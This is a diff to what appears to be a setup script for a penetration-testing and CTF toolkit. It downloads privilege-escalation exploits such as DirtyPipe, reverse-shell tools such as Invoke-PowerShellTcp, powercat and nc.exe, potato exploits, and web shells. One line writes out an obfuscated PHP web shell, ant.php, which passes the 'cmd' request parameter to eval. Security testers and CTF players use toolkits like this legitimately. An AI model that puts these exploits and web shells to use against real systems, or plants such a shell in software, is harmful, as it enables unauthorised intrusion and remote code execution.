@@ -91,7 +91,7 @@ wget https://raw.githubusercontent.com/Liuk3r/CVE-2023-32233/main/exploit.c && m
 wget https://raw.githubusercontent.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/main/exploit.c && mv exploit.c dirtypipe.c
 cd ../../
 mkdir ad&&cd ad
-git clone https://github.com/urbanadventurer/username-anarchy.git
+
 git clone https://github.com/r3motecontrol/Ghostpack-CompiledBinaries.git
 # impacket
 pyenv install 3.8.18
@@ -118,11 +118,11 @@ mkdir windows && cd windows
 wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
 wget https://github.com/itm4n/FullPowers/releases/download/v0.1/FullPowers.exe
 wget https://raw.githubusercontent.com/int0x33/nc.exe/master/nc64.exe
-wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
+wget https://github.com/tylerdotrar/SigmaPotato/releases/latest/download/SigmaPotato.exe
 wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winpeas.bat
 wget https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1
 cd ../
-mkdir webshell && cd webshell
+mkdir web && cd web
 wget https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
 wget https://github.com/AntSwordProject/AntSword-Loader/releases/download/4.0.3/AntSword-Loader-v4.0.3-linux-x64.zip
 unzip AntSword-Loader-v4.0.3-linux-x64.zip
@@ -130,7 +130,15 @@ rm -rf AntSword-Loader-v4.0.3-linux-x64.zip
 mv AntSword-Loader-v4.0.3-linux-x64 AntSword
 echo "<?php class G16f8j67 { public function __construct($H6nC8){ @eval("/*Z5934A463v*/".$H6nC8.""); }}new G16f8j67($_REQUEST['cmd']);?>" > ant.php
 sleep 2
+wget https://raw.githubusercontent.com/synacktiv/php_filter_chain_generator/main/php_filter_chain_generator.py
+
 clear
+cd ../
+mkdir ctf && cd ctf
+git clone https://github.com/urbanadventurer/username-anarchy.git
+wget https://raw.githubusercontent.com/ius/rsatool/master/rsatool.py
+git clone https://github.com/RsaCtfTool/RsaCtfTool.git
+
 sleep 2
 pip install bloodyAD
 sleep 2
